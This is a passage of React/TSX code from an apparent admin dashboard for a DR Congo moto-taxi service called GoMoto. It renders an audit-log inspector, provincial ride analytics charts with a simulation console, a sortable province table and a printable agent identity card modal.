                                {new Date(log.timestamp).toLocaleDateString("fr-FR")} {new Date(log.timestamp).toLocaleTimeString("fr-FR", {hour: '2-digit', minute: '2-digit', second: '2-digit'})}
                              </span>
                            </div>
                            
                            <p className="font-semibold text-slate-800 mt-1.5 leading-relaxed text-left">{log.details}</p>
                            
                            <div className="flex flex-wrap justify-between items-center gap-2 mt-2 text-[10px] text-slate-500">
                              <span>Acteur : <strong className="text-slate-700 font-bold">{log.adminName}</strong> ({log.adminEmail})</span>
                              {log.targetName && log.targetName !== "none" && (
                                <span className="font-medium bg-slate-100 px-1.5 py-0.5 rounded text-[9px] text-slate-600 block">Cible : {log.targetName}</span>
                              )}
                            </div>
                          </div>
                        )
                      })
                    )}
                  </div>

                </div>
              </div>
            </div>

            {/* Log Details JSON Inspector */}
                {selectedLog && (
                  <div className="bg-slate-900 border border-slate-800 text-white rounded-3xl p-5 space-y-4 animate-in slide-in-from-bottom duration-350">
                    <div className="flex justify-between items-center pb-2.5 border-b border-slate-800">
                      <div>
                        <h4 className="font-bold text-xs uppercase tracking-wider text-emerald-400 font-sans">Inspecteur de Trame d'Intégrité d'État</h4>
                        <p className="text-[10px] text-slate-400 font-mono mt-0.5">{selectedLog.id} • {new Date(selectedLog.timestamp).toLocaleString("fr-FR")}</p>
                      </div>
                      <button
                        type="button"
                        onClick={() => setSelectedLog(null)}
                        className="text-xs bg-slate-800 hover:bg-slate-750 px-2.5 py-1 rounded-xl text-slate-300 font-bold transition-all cursor-pointer font-sans"
                      >
                        Masquer l'Inspecteur
                      </button>
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs font-mono">
                      <div className="bg-slate-950 p-3.5 rounded-xl overflow-x-auto border border-slate-850">
                        <span className="text-[9.5px] font-bold uppercase tracking-wider text-slate-500 block mb-2 font-sans border-b border-slate-900/50 pb-1">Scénario de départ (Payload Before)</span>
                        {selectedLog.payloadBefore ? (
                          <pre className="text-[10.5px] text-indigo-300 leading-relaxed font-mono">
                            {JSON.stringify(selectedLog.payloadBefore, null, 2)}
                          </pre>
                        ) : (
                          <span className="text-slate-600 text-[10px] italic font-sans animate-pulse">Aucune donnée historique préalable de modifications</span>
                        )}
                      </div>
                      
                      <div className="bg-slate-950 p-3.5 rounded-xl overflow-x-auto border border-slate-850">
                        <span className="text-[9.5px] font-bold uppercase tracking-wider text-yellow-500 block mb-2 font-sans border-b border-slate-900/50 pb-1">Scénario d'Assiette de conformité (Payload After)</span>
                        {selectedLog.payloadAfter ? (
                          <pre className="text-[10.5px] text-yellow-500 leading-relaxed font-mono">
                            {JSON.stringify(selectedLog.payloadAfter, null, 2)}
                          </pre>
                        ) : (
                          <span className="text-slate-600 text-[10px] italic font-sans animate-pulse">Aucun payload d'arrivée enregistré pour cette action</span>
                        )}
                      </div>
                    </div>

                  </div>
                )}
            </div>
        );
      })()}

      {/* ================= ADMIN TAB 10: INTERACTIVE REGISTER & RECHARTS ANALYTICS ================= */}
      {activeSubTab === "analytics" && (
        <div className="space-y-6 animate-in fade-in duration-300 text-slate-800 text-left">
          
          {/* Header section explaining the core regulation and telemetry of courses */}
          <div className="flex justify-between items-start gap-4 flex-wrap bg-white border border-slate-200 p-5 rounded-3xl">
            <div>
              <h3 className="font-bold text-slate-900 text-sm flex items-center gap-2">
                <Activity className="w-5 h-5 text-indigo-600" />
                <span>Registre National de Télémesure des Flux & Courses en RDC</span>
              </h3>
              <p className="text-[10px] text-slate-500 mt-0.5 font-sans leading-tight">
                Analyse cartographique, volume d'activité et audit financier décentralisé à travers les 26 provinces souveraines de la République Démocratique du Congo.
              </p>
            </div>
            <div className="flex gap-2">
              <button
                type="button"
                onClick={handleResetProvinceData}
                className="bg-red-50 hover:bg-red-105 border border-red-200 text-red-700 px-3 py-1.5 rounded-xl text-[10px] font-bold uppercase tracking-wider transition-all flex items-center gap-1.5 cursor-pointer shadow-xs"
                title="Rétablir les données d'usine des 26 provinces"
              >
                <RotateCcw className="w-3.5 h-3.5 text-red-650" />
                <span>Rétablir Défauts</span>
              </button>
            </div>
          </div>

          {/* Core Analytics Metrics Grid */}
          <div className="grid grid-cols-2 lg:grid-cols-5 gap-4">
            <div className="bg-slate-50 p-4 rounded-2xl border border-slate-200 shadow-xs text-left">
              <span className="text-[8px] font-bold text-slate-405 uppercase tracking-widest block font-mono">COURSES GLOBAL RDC</span>
              <span className="text-lg font-mono font-bold text-slate-900 block mt-1">
                {provinceDataList.reduce((acc, p) => acc + p.rides, 0).toLocaleString()} runs
              </span>
              <span className="text-[9px] text-slate-500 block font-medium mt-0.5">Sur l'ensemble du territoire</span>
            </div>

            <div className="bg-slate-50 p-4 rounded-2xl border border-slate-200 shadow-xs text-left">
              <span className="text-[8px] font-bold text-slate-405 uppercase tracking-widest block font-mono">MOTARDS ENRÔLÉS</span>
              <span className="text-lg font-mono font-bold text-indigo-700 block mt-1">
                {provinceDataList.reduce((acc, p) => acc + p.motards, 0).toLocaleString()} pilotes
              </span>
              <span className="text-[9px] text-indigo-600 font-bold block mt-0.5">Vérifications d'État OK</span>
            </div>

            <div className="bg-slate-50 p-4 rounded-2xl border border-slate-200 shadow-xs text-left">
              <span className="text-[8px] font-bold text-slate-405 uppercase tracking-widest block font-mono">PASSAGERS ACTIFS</span>
              <span className="text-lg font-mono font-bold text-slate-800 block mt-1">
                {provinceDataList.reduce((acc, p) => acc + p.clients, 0).toLocaleString()} citoy.
              </span>
              <span className="text-[9px] text-slate-500 block font-medium mt-0.5">Base passagers nationale</span>
            </div>

            <div className="bg-slate-50 p-4 rounded-2xl border border-slate-200 shadow-xs text-left">
              <span className="text-[8px] font-bold text-slate-405 uppercase tracking-widest block font-mono">REVENUS INTÉGRÉS</span>
              <span className="text-lg font-mono font-bold text-emerald-650 block mt-1">
                {provinceDataList.reduce((acc, p) => acc + p.revenue, 0).toLocaleString()} CDF
              </span>
              <span className="text-[9px] text-emerald-600 font-bold block mt-0.5 font-sans">Redistribution locale RDC</span>
            </div>

            <div className="bg-slate-50 p-4 rounded-2xl border border-slate-200 shadow-xs text-left col-span-2 lg:col-span-1">
              <span className="text-[8px] font-bold text-amber-600 uppercase tracking-widest block font-mono">👑 TOP PROVINCE</span>
              <span className="text-lg font-bold text-amber-900 block mt-1 truncate">
                {[...provinceDataList].sort((a, b) => b.rides - a.rides)[0]?.name || "Kinshasa"}
              </span>
              <span className="text-[9px] text-slate-500 block font-medium mt-0.5">
                {[...provinceDataList].sort((a, b) => b.rides - a.rides)[0]?.rides.toLocaleString() || 0} courses enregistrées
              </span>
            </div>
          </div>

          {/* Main Visualizer and Control Card columns */}
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            
            {/* Left side: Dynamic Interactive Chart Card */}
            <div className="lg:col-span-2 bg-white border border-slate-200 p-5 rounded-3xl shadow-xs space-y-4">
              <div className="flex justify-between items-center gap-4 flex-wrap pb-2 border-b border-slate-100">
                <div>
                  <h4 className="font-extrabold text-[#1E3A8A] text-xs uppercase tracking-wider">Histogrammes des courses par Province</h4>
                  <p className="text-[9.5px] text-slate-500 mt-0.5">Survolez ou cliquez pour spotlight une province</p>
                </div>

                {/* Chart format toggles */}
                <div className="flex bg-slate-100 p-1 rounded-xl gap-0.5 border border-slate-200">
                  <button
                    type="button"
                    onClick={() => setChartType("bar")}
                    className={`px-2.5 py-1 rounded-lg text-[9px] font-bold uppercase transition-all cursor-pointer ${
                      chartType === "bar" ? "bg-white text-indigo-700 shadow-xs font-sans" : "text-slate-500 hover:text-slate-800"
                    }`}
                  >
                    Barres
                  </button>
                  <button
                    type="button"
                    onClick={() => setChartType("line")}
                    className={`px-2.5 py-1 rounded-lg text-[9px] font-bold uppercase transition-all cursor-pointer ${
                      chartType === "line" ? "bg-white text-indigo-700 shadow-xs font-sans" : "text-slate-500 hover:text-slate-800"
                    }`}
                  >
                    Aire Curve
                  </button>
                  <button
                    type="button"
                    onClick={() => setChartType("pie")}
                    className={`px-2.5 py-1 rounded-lg text-[9px] font-bold uppercase transition-all cursor-pointer ${
                      chartType === "pie" ? "bg-white text-indigo-700 shadow-xs font-sans" : "text-slate-500 hover:text-slate-800"
                    }`}
                  >
                    Top 5 Pie
                  </button>
                </div>
              </div>

              {/* Chart container */}
              <div className="w-full h-85 bg-slate-50 p-3 rounded-2xl border border-slate-100 flex items-center justify-center relative overflow-hidden">
                <ResponsiveContainer width="100%" height="100%">
                  {chartType === "bar" ? (
                    <BarChart data={provinceDataList} margin={{ top: 10, right: 10, left: 0, bottom: 20 }}>
                      <CartesianGrid strokeDasharray="3 3" stroke="#E2E8F0" vertical={false} />
                      <XAxis dataKey="code" tick={{ fill: '#64748B', fontSize: 9, fontWeight: 'bold' }} tickLine={false} axisLine={false} />
                      <YAxis tick={{ fill: '#64748B', fontSize: 9 }} tickLine={false} axisLine={false} />
                      <Tooltip content={<CustomTooltip />} />
                      <Bar dataKey="rides" radius={[4, 4, 0, 0]} cursor="pointer">
                        {provinceDataList.map((entry, index) => (
                          <Cell
                            key={`cell-${index}`}
                            fill={entry.code === selectedProvince.code ? "#F59E0B" : "#4F46E5"}
                            stroke={entry.code === selectedProvince.code ? "#D97706" : "none"}
                            strokeWidth={entry.code === selectedProvince.code ? 1.5 : 0}
                            onClick={() => setSelectedProvince(entry)}
                          />
                        ))}
                      </Bar>
                    </BarChart>
                  ) : chartType === "line" ? (
                    <AreaChart data={provinceDataList} margin={{ top: 10, right: 10, left: 0, bottom: 20 }}>
                      <defs>
                        <linearGradient id="colorRides" x1="0" y1="0" x2="0" y2="1">
                          <stop offset="5%" stopColor="#4F46E5" stopOpacity={0.25}/>
                          <stop offset="95%" stopColor="#4F46E5" stopOpacity={0}/>
                        </linearGradient>
                      </defs>
                      <CartesianGrid strokeDasharray="3 3" stroke="#E2E8F0" vertical={false} />
                      <XAxis dataKey="code" tick={{ fill: '#64748B', fontSize: 9, fontWeight: 'bold' }} tickLine={false} axisLine={false} />
                      <YAxis tick={{ fill: '#64748B', fontSize: 9 }} tickLine={false} axisLine={false} />
                      <Tooltip content={<CustomTooltip />} />
                      <Area type="monotone" dataKey="rides" stroke="#4F46E5" strokeWidth={2.5} fillOpacity={1} fill="url(#colorRides)" activeDot={{ r: 6 }} />
                    </AreaChart>
                  ) : (
                    <PieChart>
                      <Pie
                        data={getPieData()}
                        cx="50%"
                        cy="48%"
                        innerRadius={55}
                        outerRadius={85}
                        paddingAngle={3}
                        dataKey="rides"
                        cursor="pointer"
                      >
                        {getPieData().map((entry, index) => (
                          <Cell
                            key={`cell-${index}`}
                            fill={entry.color}
                            onClick={() => {
                              const found = provinceDataList.find(p => p.code === entry.code);
                              if (found) setSelectedProvince(found);
                            }}
                          />
                        ))}
                      </Pie>
                      <Tooltip content={({ active, payload }: any) => {
                        if (active && payload && payload.length) {
                          const data = payload[0].payload;
                          return (
                            <div className="bg-slate-900 text-white text-[11px] border border-slate-700/80 rounded-xl p-3 shadow-md space-y-1">
                              <span className="font-extrabold uppercase text-yellow-405">{data.name}</span>
                              <p className="mt-1">Courses : <span className="font-mono font-bold text-white">{data.rides.toLocaleString()} runs</span></p>
                              <p className="text-emerald-400">Revenus d'état : <span className="font-mono">{(data.revenue).toLocaleString()} CDF</span></p>
                            </div>
                          );
                        }
                        return null;
                      }} />
                      <Legend verticalAlign="bottom" height={36} iconSize={8} iconType="circle" wrapperStyle={{ fontSize: 9, fontWeight: 'bold', textTransform: 'uppercase' }} />
                    </PieChart>
                  )}
                </ResponsiveContainer>
              </div>

              <div className="text-[10px] text-slate-400 flex items-center gap-1.5 justify-center font-medium">
                <Info className="w-3.5 h-3.5 text-indigo-500 shrink-0" />
                <span>Cliquez sur une barre, une courbe ou un secteur pour projeter les variables fédérales de cette province.</span>
              </div>
            </div>

            {/* Right side: Spotlight and Simulation Console Card */}
            <div className="bg-slate-950 text-white border border-slate-800 p-5 rounded-3xl shadow-lg space-y-5 flex flex-col justify-between">
              
              <div className="space-y-4">
                <div className="flex items-center gap-2 pb-2.5 border-b border-slate-850">
                  <div className="bg-indigo-600/15 border border-indigo-500/20 p-2 rounded-xl text-yellow-500 shrink-0">
                    <MapPin className="w-5 h-5 text-yellow-500" />
                  </div>
                  <div className="text-left">
                    <span className="text-[8.5px] font-bold text-indigo-400 uppercase tracking-widest block font-mono">SPOTLIGHT PROVINCIAL</span>
                    <h4 className="font-extrabold text-[13px] text-slate-100 flex items-center gap-1.5">
                      <span>{selectedProvince ? selectedProvince.name : "Kinshasa"}</span>
                      <span className="bg-indigo-900/60 border border-indigo-700 text-indigo-300 px-1.5 py-0.5 rounded text-[8px] font-mono font-bold">{selectedProvince?.code}</span>
                    </h4>
                  </div>
                </div>

                {/* Spot Metrics */}
                {selectedProvince && (
                  <div className="space-y-3 pt-1 text-left">
                    <div className="grid grid-cols-2 gap-3 text-xs">
                      <div className="bg-slate-900/40 p-3 rounded-xl border border-slate-850">
                        <span className="text-[8px] text-slate-400 block uppercase tracking-wider">Courses RDC :</span>
                        <span className="text-xs font-mono font-bold text-slate-200 mt-0.5 block">{selectedProvince.rides.toLocaleString()} runs</span>
                      </div>
                      <div className="bg-slate-900/40 p-3 rounded-xl border border-slate-850 font-sans">
                        <span className="text-[8px] text-slate-400 block uppercase tracking-wider">Qualité Service :</span>
                        <span className="text-xs font-mono font-bold text-amber-400 mt-0.5 block">★ {selectedProvince.rating.toFixed(1)} / 5</span>
                      </div>
                      <div className="bg-slate-900/40 p-3 rounded-xl border border-slate-850">
                        <span className="text-[8px] text-slate-400 block uppercase tracking-wider">Motards Actifs :</span>
                        <span className="text-xs font-semibold text-slate-200 mt-0.5 block">{selectedProvince.motards.toLocaleString()}</span>
                      </div>
                      <div className="bg-slate-900/40 p-3 rounded-xl border border-slate-850 font-sans">
                        <span className="text-[8px] text-slate-400 block uppercase tracking-wider">Passagers :</span>
                        <span className="text-xs font-semibold text-slate-200 mt-0.5 block">{selectedProvince.clients.toLocaleString()}</span>
                      </div>
                    </div>

                    <div className="bg-slate-900 p-3 border border-indigo-950/80 text-left rounded-xl">
                      <span className="text-[8.5px] text-slate-400 uppercase tracking-widest block font-mono">REVENUS ACCUMULÉS CONGO :</span>
                      <span className="text-base font-mono font-bold text-emerald-400 block mt-0.5">{selectedProvince.revenue.toLocaleString()} CDF</span>
                      <span className="text-[8.5px] text-slate-550 block leading-tight mt-1 font-sans">Calculé sur la base de la co-régulation fiscale de GoMoto (3,000 CDF / course moyenne).</span>
                    </div>
                  </div>
                )}
              </div>

              {/* Simulation Interactive Form */}
              <div className="bg-slate-900 border border-slate-850 rounded-2xl p-4 space-y-4 text-left">
                <span className="text-[9px] font-bold text-indigo-400 uppercase tracking-wider block font-mono">📢 CONSOLE DE SIMULATION DE TRAFFIC RDC</span>
                
                <div className="space-y-1">
                  <label className="text-[9.5px] text-slate-400 font-bold uppercase font-mono block">Volume à injecter en temps réel :</label>
                  <div className="grid grid-cols-3 gap-1.5">
                    {[100, 500, 1000].map((num) => (
                      <button
                        type="button"
                        key={num}
                        onClick={() => setSimNewRidesAmount(num)}
                        className={`py-1.5 rounded-lg text-xs font-mono font-bold border transition-all cursor-pointer ${
                          simNewRidesAmount === num 
                            ? "bg-indigo-650 border-indigo-400 text-white shadow-xs" 
                            : "bg-slate-950 border-slate-850 text-slate-400 hover:bg-slate-800 hover:text-slate-300"
                        }`}
                      >
                        +{num}
                      </button>
                    ))}
                  </div>
                </div>

                <div className="space-y-2 pt-1">
                  <button
                    type="button"
                    onClick={() => handleSimulateRides(simNewRidesAmount)}
                    className="w-full py-2 bg-gradient-to-r from-emerald-600 to-sky-600 hover:from-emerald-700 hover:to-sky-700 text-white font-extrabold text-[10.5px] uppercase rounded-xl transition-all shadow-md hover:scale-[1.01] active:scale-[0.99] cursor-pointer flex justify-center items-center gap-1.5"
                  >
                    <Plus className="w-4 h-4 text-white" />
                    <span>Injecter {simNewRidesAmount.toLocaleString()} courses</span>
                  </button>
                  <span className="text-[8.5px] text-slate-500 block leading-relaxed text-center italic font-sans select-none">
                    L'unification d'État actualise en temps réel le graphe provincial et le stockage local de votre navigateur.
                  </span>
                </div>
              </div>

            </div>
          </div>

          {/* Provincial Audit Registry and Searchable Table */}
          <div className="bg-white border border-slate-200 rounded-3xl overflow-hidden shadow-xs space-y-4 p-5 text-left">
            
            <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3 pb-2.5 border-b border-slate-100">
              <div>
                <h4 className="font-extrabold text-[#1E3A8A] text-xs uppercase tracking-wider">Registre Provincial Complet (26 Provinces d'État)</h4>
                <p className="text-[10px] text-slate-500 mt-0.5 font-sans">Triez, cherchez et sélectionnez pour modifier ou simuler l'activité de voirie.</p>
              </div>

              {/* Input for filter */}
              <div className="relative w-full sm:w-64">
                <Search className="w-3.5 h-3.5 text-slate-400 absolute left-3 top-1/2 -translate-y-1/2" />
                <input
                  type="text"
                  placeholder="Rechercher une province..."
                  value={searchProvince}
                  onChange={(e) => setSearchProvince(e.target.value)}
                  className="w-full bg-slate-50 border border-slate-200 rounded-xl text-xs pl-8.5 pr-3 py-1.5 outline-none text-slate-800 placeholder-slate-450 font-semibold focus:bg-white focus:border-indigo-500 transition-all font-sans"
                />
              </div>
            </div>

            {/* Table layout with scroll */}
            <div className="overflow-x-auto scroller-hidden border border-slate-150 rounded-2xl">
              <table className="w-full text-left border-collapse text-[11px]">
                <thead>
                  <tr className="bg-slate-50 text-slate-500 uppercase text-[8px] tracking-widest font-mono border-b border-slate-200">
                    <th className="p-3.5 cursor-pointer hover:bg-slate-100 hover:text-slate-800 transition-colors" onClick={() => {
                      setProvinceSortField("name");
                      setProvinceSortOrder(prev => prev === "asc" ? "desc" : "asc");
                    }}>
                      Province d'Intervention {provinceSortField === "name" && (provinceSortOrder === "asc" ? "▲" : "▼")}
                    </th>
                    <th className="p-3.5 cursor-pointer hover:bg-slate-100 hover:text-slate-800 transition-colors" onClick={() => {
                      setProvinceSortField("rides");
                      setProvinceSortOrder(prev => prev === "asc" ? "desc" : "asc");
                    }}>
                      Volume Courses {provinceSortField === "rides" && (provinceSortOrder === "asc" ? "▲" : "▼")}
                    </th>
                    <th className="p-3.5 cursor-pointer hover:bg-slate-100 hover:text-slate-800 transition-colors" onClick={() => {
                      setProvinceSortField("motards");
                      setProvinceSortOrder(prev => prev === "asc" ? "desc" : "asc");
                    }}>
                      Motards Actifs {provinceSortField === "motards" && (provinceSortOrder === "asc" ? "▲" : "▼")}
                    </th>
                    <th className="p-3.5 cursor-pointer hover:bg-slate-100 hover:text-slate-800 transition-colors" onClick={() => {
                      setProvinceSortField("clients");
                      setProvinceSortOrder(prev => prev === "asc" ? "desc" : "asc");
                    }}>
                      Passagers {provinceSortField === "clients" && (provinceSortOrder === "asc" ? "▲" : "▼")}
                    </th>
                    <th className="p-3.5 cursor-pointer hover:bg-slate-100 hover:text-slate-800 transition-colors" onClick={() => {
                      setProvinceSortField("revenue");
                      setProvinceSortOrder(prev => prev === "asc" ? "desc" : "asc");
                    }}>
                      Revenus Publics (CDF) {provinceSortField === "revenue" && (provinceSortOrder === "asc" ? "▲" : "▼")}
                    </th>
                    <th className="p-3.5 cursor-pointer hover:bg-slate-100 hover:text-slate-800 transition-colors" onClick={() => {
                      setProvinceSortField("rating");
                      setProvinceSortOrder(prev => prev === "asc" ? "desc" : "asc");
                    }}>
                      Qualité Index {provinceSortField === "rating" && (provinceSortOrder === "asc" ? "▲" : "▼")}
                    </th>
                    <th className="p-3.5 text-right">Action</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-100">
                  {sortedAndFilteredProvinces.map((p) => {
                    const isSelected = selectedProvince?.code === p.code;
                    return (
                      <tr
                        key={p.code}
                        className={`transition-colors cursor-pointer duration-150 ${
                          isSelected ? "bg-indigo-50/70 hover:bg-indigo-100/60 font-medium" : "hover:bg-slate-50/50"
                        }`}
                        onClick={() => setSelectedProvince(p)}
                      >
                        <td className="p-3.5">
                          <div className="flex items-center gap-2">
                            <span className="font-extrabold text-slate-800 text-[11.5px] font-sans">{p.name}</span>
                            <span className="bg-slate-150 text-slate-550 px-1 py-0.5 rounded font-mono font-bold text-[8.5px] uppercase border border-slate-200">{p.code}</span>
                          </div>
                        </td>
                        <td className="p-3.5 font-mono font-bold text-slate-700 text-left">
                          {p.rides.toLocaleString()} runs
                        </td>
                        <td className="p-3.5 font-semibold text-slate-600">
                          {p.motards.toLocaleString()}
                        </td>
                        <td className="p-3.5 text-slate-550">
                          {p.clients.toLocaleString()}
                        </td>
                        <td className="p-3.5 font-mono font-bold text-emerald-600 text-left">
                          {p.revenue.toLocaleString()} CDF
                        </td>
                        <td className="p-3.5 font-bold text-yellow-600 text-left">
                          ★ {p.rating.toFixed(1)} / 5
                        </td>
                        <td className="p-3.5 text-right">
                          <button
                            type="button"
                            onClick={(e) => {
                              e.stopPropagation();
                              setSelectedProvince(p);
                            }}
                            className={`px-2 py-1 rounded-lg text-[9px] font-bold uppercase tracking-wider transition-all cursor-pointer ${
                              isSelected ? "bg-indigo-600 text-white" : "bg-slate-100 text-slate-700 hover:bg-slate-200"
                            }`}
                          >
                            Cibler
                          </button>
                        </td>
                      </tr>
                    );
                  })}
                  {sortedAndFilteredProvinces.length === 0 && (
                    <tr>
                      <td colSpan={7} className="p-8 text-center text-slate-400 italic font-mono text-[10px]">
                        Aucune des 26 provinces ne correspond à votre recherche "{searchProvince}".
                      </td>
                    </tr>
                  )}
                </tbody>
              </table>
            </div>
          </div>

        </div>
      )}

      {/* DIGITAL AGENT IDENTITY CARD MODAL */}
      {selectedIdCardAdmin && (
        <div className="fixed inset-0 bg-slate-950/80 backdrop-blur-md z-[9999] flex items-center justify-center p-4 transition-all animate-in fade-in duration-300">
          <div className="bg-[#090D16] border border-[#1E293B] rounded-3xl max-w-md w-full overflow-hidden shadow-2xl relative text-left">
            
            {/* Header / Sovereign Band */}
            <div className="bg-gradient-to-r from-indigo-950 via-slate-900 to-indigo-950 p-5 border-b border-indigo-900/40 relative">
              <button
                type="button"
                onClick={() => setSelectedIdCardAdmin(null)}
                className="absolute right-4 top-4 text-slate-400 hover:text-white bg-slate-800/40 hover:bg-slate-800 p-1.5 rounded-full transition-all cursor-pointer"
              >
                <X className="w-4 h-4" />
              </button>
              
              <div className="text-center space-y-1">
                <span className="text-[10px] font-black tracking-[0.15em] text-cyan-400 uppercase font-mono block">
                  RÉPUBLIQUE DÉMOCRATIQUE DU CONGO
                </span>
                <span className="text-[8px] font-bold text-slate-400 block uppercase leading-none">
                  MINISTÈRE DES TRANSPORTS & VOIES DE COMMUNICATION
                </span>
                <span className="text-[11px] font-extrabold text-white tracking-wider block font-sans uppercase">
                  Carte d'Identité Administrative Numérique
                </span>
              </div>
            </div>

            {/* Card Body */}
            <div className="p-6 space-y-6 relative">
              
              {/* Background badge overlay */}
              <div className="absolute inset-x-0 top-1/2 -translate-y-1/2 flex justify-center opacity-5 pointer-events-none">
                <ShieldCheck className="w-64 h-64 text-indigo-400" />
              </div>

              {/* Main Badge/ID Grid layout */}
              <div className="grid grid-cols-12 gap-5 relative z-10">
                
                {/* Photo & Agent Number column */}
                <div className="col-span-4 flex flex-col items-center space-y-2">
                  <div className="w-24 h-28 rounded-2xl bg-gradient-to-b from-indigo-950 to-[#0B1528] border-2 border-indigo-500/40 p-1.5 flex items-center justify-center relative overflow-hidden group shadow-lg">
                    {/* ID picture simulation */}
                    <div className="absolute inset-0 bg-cyan-500/10 mix-blend-color hover:bg-transparent transition-all"></div>
                    <div className="absolute top-0 left-0 right-0 h-[2px] bg-cyan-400/85 animate-pulse"></div>
                    
                    <div className="flex flex-col items-center justify-center text-slate-500 text-center space-y-1.5">
                      <User className="w-10 h-10 text-slate-300" />
                      <span className="text-[7px] text-cyan-400 font-mono font-bold tracking-widest uppercase">
                        AGENT AGRÉÉ
                      </span>
                    </div>

                    {/* Hologram Overlay logo */}
                    <div className="absolute bottom-1 right-1 bg-indigo-600/80 text-white rounded p-0.5 text-[6px] font-sans font-bold shadow">
                      GOMOTO
                    </div>
                  </div>

                  {/* Stamp */}
                  <div className="border border-green-500/35 bg-green-500/5 text-green-400 rounded-lg px-2 py-0.5 text-center flex items-center gap-1 justify-center w-full">
                    <span className="text-[7.5px] font-black uppercase font-sans tracking-wide">
                      ● VALIDÉ DGI
                    </span>
                  </div>
                </div>

                {/* Detail column (Name, role, province, status etc) */}
                <div className="col-span-8 space-y-3.5">
                  <div>
                    <span className="text-[8px] text-slate-400 uppercase font-mono tracking-wider block">Nom de l'Agent</span>
                    <span className="text-sm font-black text-white block truncate leading-none mt-1">
                      {selectedIdCardAdmin.fullName}
                    </span>
                  </div>

                  <div>
                    <span className="text-[8px] text-slate-400 uppercase font-mono block tracking-wider">Titre et Fonction</span>
                    <span className="text-[10.5px] font-bold text-slate-200 mt-1 block tracking-wide leading-tight">
                      {selectedIdCardAdmin.role}
                    </span>
                  </div>

                  <div className="grid grid-cols-2 gap-2">
                    <div>
                      <span className="text-[8px] text-slate-400 uppercase font-mono block">Attribution</span>
                      <span className="text-[10.5px] font-bold text-indigo-300 mt-0.5 block">
                        Prov. {selectedIdCardAdmin.province || "Kinshasa"}
                      </span>
                    </div>

                    <div>
                      <span className="text-[8px] text-slate-400 uppercase font-mono block">Créé le</span>
                      <span className="text-[10.5px] font-mono text-slate-200 mt-0.5 block leading-none">
                        {selectedIdCardAdmin.addedAt}
                      </span>
                    </div>
                  </div>

                  <div>
                    <span className="text-[8px] text-slate-400 uppercase font-mono block">N° Agent d'État</span>
                    <span className="text-xs font-mono font-black text-cyan-400 tracking-wider bg-indigo-950/60 px-2.5 py-1 rounded-lg border border-indigo-900/30 inline-block mt-1">
                      {selectedIdCardAdmin.agentNumber || `GOMOTO-AG-2026-X`}
                    </span>
                  </div>
                </div>

              </div>

              {/* Badges system privileges granted */}
              <div className="bg-[#0B1528] rounded-2xl p-3 border border-indigo-950/60 space-y-2 text-left">
                <span className="text-[7.5px] font-black text-slate-400 uppercase tracking-wider block">
                  ACCÈS INTÉGRÉS À L'APN SYSTÈME GOMOTO :
                </span>
                <div className="flex flex-wrap gap-1.5">
                  {selectedIdCardAdmin.privileges.includes("full_access") && (
                    <span className="bg-red-500/10 text-red-400 border border-red-500/20 text-[8.5px] rounded px-2 py-0.5 font-mono font-bold">
                      ★ Accès Complet (Full)
                    </span>
                  )}
                  {selectedIdCardAdmin.privileges.includes("arbitration_rights") && (
                    <span className="bg-blue-500/10 text-blue-400 border border-blue-500/20 text-[8.5px] rounded px-2 py-0.5 font-mono">
                      📂 Arbitrage Légal
                    </span>
                  )}
                  {selectedIdCardAdmin.privileges.includes("fiscal_approvals") && (
                    <span className="bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 text-[8.5px] rounded px-2 py-0.5 font-mono">
                      🪙 Audit Fiscal
                    </span>
                  )}
                  {selectedIdCardAdmin.privileges.includes("sos_dispatching") && (
                    <span className="bg-orange-500/10 text-orange-400 border border-orange-500/20 text-[8.5px] rounded px-2 py-0.5 font-mono">
                      🚨 Centrales SOS
                    </span>
                  )}
                </div>
              </div>

              {/* QR verification code & bar-code simulation */}
              <div className="flex items-center gap-4 bg-slate-950/40 p-3 rounded-2xl border border-slate-900">
                {/* QR block code with custom visual */}
                <div className="w-14 h-14 bg-white p-1 rounded-lg flex-shrink-0 flex items-center justify-center relative shadow-sm border border-slate-200">
                  <div className="grid grid-cols-4 gap-0.5 w-full h-full opacity-90">
                    <div className="bg-slate-900 rounded-sm"></div>
                    <div className="bg-slate-900 rounded-sm"></div>
                    <div className="bg-transparent"></div>
                    <div className="bg-slate-900 rounded-sm"></div>

                    <div className="bg-transparent"></div>
                    <div className="bg-slate-900 rounded-sm"></div>
                    <div className="bg-slate-900 rounded-sm"></div>
                    <div className="bg-transparent"></div>

                    <div className="bg-slate-900 rounded-sm"></div>
                    <div className="bg-transparent"></div>
                    <div className="bg-slate-900 rounded-sm"></div>
                    <div className="bg-slate-900 rounded-sm"></div>

                    <div className="bg-slate-900 rounded-sm"></div>
                    <div className="bg-slate-900 rounded-sm"></div>
                    <div className="bg-transparent"></div>
                    <div className="bg-slate-900 rounded-sm"></div>
                  </div>
                  {/* Inner logo placeholder */}
                  <div className="absolute inset-2/5 bg-white p-0.5 flex items-center justify-center rounded">
                    <div className="w-14 h-14 bg-indigo-600 rounded-sm flex items-center justify-center text-[4px] text-white font-sans font-extrabold leading-none">
                      GM
                    </div>
                  </div>
                </div>

                <div className="space-y-1">
                  <span className="text-[8.5px] text-slate-400 uppercase tracking-widest block font-bold">
                    VÉRIFICATION SÉCURISÉE RDC
                  </span>
                  <p className="text-[7.5px] text-slate-500 font-mono leading-tight">
                    Scannez l'ID pour auditer en direct les habilitations de l'agent sur la base d'immatriculation d'État GoMoto RDC.
                  </p>
                </div>
              </div>

            </div>

            {/* Footer Band with controls */}
            <div className="bg-slate-950 p-4 border-t border-indigo-950/80 flex items-center justify-between gap-3 font-sans">
              <span className="text-[8px] font-mono text-slate-500 uppercase">
                PROV: {selectedIdCardAdmin.province ? selectedIdCardAdmin.province.toUpperCase() : "KINSHASA"} / ID: {selectedIdCardAdmin.agentNumber}
              </span>
              
              <div className="flex gap-2">
                <button
                  type="button"
                  onClick={() => {
                    alert(`Génération de la carte d'identité numérique d'État de l'agent ${selectedIdCardAdmin.fullName} lancée.`);
                    window.print();
                  }}
                  className="px-3.5 py-1.5 bg-gradient-to-r from-indigo-650 to-cyan-600 hover:from-indigo-700 hover:to-cyan-700 text-white font-bold text-[10px] uppercase rounded-xl shadow-md transition-all cursor-pointer flex items-center gap-1"
                >
                  <Printer className="w-3.5 h-3.5" />
                  <span>Imprimer en PDF</span>
                </button>
              </div>
            </div>

          </div>
        </div>
      )}

